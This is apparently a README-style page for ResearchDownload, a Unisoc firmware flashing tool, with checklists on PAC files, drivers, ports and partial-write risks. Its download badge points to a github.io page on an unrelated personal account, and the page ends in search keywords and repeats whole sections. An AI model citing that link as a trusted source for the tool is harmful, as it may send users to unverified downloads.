# ResearchDownload - A Mapped Unisoc Download for One Package

## Why This Window Exists

Some Unisoc service packages are not a single click. They include a PAC, a file list, and a mode the guide expects you to select. ResearchDownload shows those pieces so a technician can confirm the flash files before the USB transfer starts. The extra detail is useful and also how people enable a partition they did not mean to touch. Load the package, read the list, and change a tick only when the service note for this model says to.

The phone has to be in the download mode that this driver understands. A phone that still boots Android is not in that mode. If the goal is a backup of photos, take it in Android. ResearchDownload overwrites storage according to the package.

## What You Confirm

| Item | Look for |
|---|---|
| PAC path | The file for this exact model |
| File list | Names you recognize from the guide, not a edited mix |
| Baud or mode | Whatever that package's note requires |
| Port | Appears after the key combo, not before |
| Backup ticks | Off, unless you have a reason and the space |

Do not import a file list from a different PAC. The offsets belong to the package that created them. A list that "looks right" from another phone is a map of the wrong storage.

[![Open ResearchDownload](https://img.shields.io/badge/Open-ResearchDownload-334155?style=for-the-badge&logo=android&logoColor=white)](https://adelinachapinevblt.github.io/.github/researchdownload-pac)

## Session

1. Install the Unisoc download driver and reboot if ports never enumerate.
2. Open ResearchDownload and load this model's PAC.
3. Read the file list without editing it.
4. Connect the phone in download mode and confirm the port.
5. Start the download and wait for the stop condition the tool reports.
6. Power on only after the tool releases the device.

If the first boot fails, repeat the same unmodified package. Editing the list between attempts multiplies the number of things that might be wrong.

Partial writes are the hazard. A USB hub that sleeps, a laptop on battery that suspends, or a cable that only charges will stop the tool at a percentage and leave the phone unable to start. Use a rear port on a machine that will stay awake. Tell the tool to run only when you can watch it.

## Who It Is For

Repair work that already has a Unisoc package and a note that names this tool. A poor fit for a first-time user who only needed SPD Upgrade Tool's single PAC button. A poor fit for Qualcomm, MediaTek, or a locked account. The download writes firmware. It does not log you into someone else's phone.

## Requirements

| Item | Expectation |
|---|---|
| Phone | Unisoc or Spreadtrum device matching the PAC |
| PC | Windows build the tool still runs on |
| Package | Original PAC and its file list together |
| Driver | Installed before the phone is connected |
| Power | Stable for the whole download |

## Fixes

The PAC loads and the list is empty. The package is incomplete. Replace the file.
No port appears. The mode or the driver is wrong. Do not start a download against a blank port.
You changed several ticks and the phone is dead. Return to the original list and write the package again.
The tool is older than the PAC. Use the build the package documents rather than the first ResearchDownload a search offered.
The phone boots but the baseband is missing. The PAC was a partial research set. Use a full package for this model.

![ResearchDownload with a PAC file list before the port is started](https://www.hovatek.com/blog/bpyeki/uploads/2019/08/build-SPD-pac-using-research-download-tool-4.png)

## Keep the Package Intact

Store the PAC and the files ResearchDownload extracted as one folder named with the model and date. Do not tidy it. The next flash of this phone should start from that folder, not from a cleaned-up subset. If you must service a second model, give it a second folder. ResearchDownload will remember the last path, and the last path should still be the right phone.

## Unedited List, Then the Download

If you changed ticks and the phone died, put the original list back and write the package again. A PAC that opens with an empty file list is incomplete. A port that never appears means you must not start. Use the tool build the package documents. A missing baseband after boot means you used a partial research set. Get the full PAC for this model. Store the files as one folder. Tidying them breaks the next flash.

- List read, not edited
- Port confirmed
- PC kept awake
- Same package retried
- Second model in a second folder

## Do Not Tidy the Package

Zip the whole PAC directory if you must archive it. A cleaned subset is a phone that loses its baseband or fails the next download. Keep the PC from sleeping. A hub is a bad place for this write. If the first boot is wrong, repeat the unmodified package. Editing the list between attempts adds causes. This is Unisoc firmware you are allowed to write, not a lock removal.

- Full folder preserved
- Sleep disabled
- Rear port
- Original ticks restored if you experimented

## Further Reading

researchdownload, unisoc research download, spreadtrum research tool, researchdownload pac, unisoc file list flash, spd research mode, unisoc download driver, researchdownload windows
